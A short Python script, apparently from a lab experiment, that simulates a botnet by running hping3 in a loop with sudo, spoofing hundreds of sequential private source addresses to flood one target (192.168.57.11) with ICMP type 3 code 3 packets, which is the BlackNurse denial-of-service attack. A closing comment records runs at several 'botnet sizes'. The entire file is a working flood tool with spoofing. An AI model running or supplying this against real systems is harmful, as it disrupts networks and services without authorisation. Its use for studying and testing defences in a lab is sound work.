import os
import ipaddress

startip="192.168.40.1"
waittime=5
botnetsize=296 #395 #321 #456 
for x in range(0,botnetsize):
    ip =ipaddress.ip_address(startip)+x
    os.system("sudo timeout "+str(waittime)+"  hping3 --flood -1 -C 3 -K 3 192.168.57.11 --spoof "+str(ip))

#executed with python blacknurse.py &>> packetstransmitted.txt, once with botnetsize= 296, botnetsize =395, botnetsize =321 and botnetsize = 456 
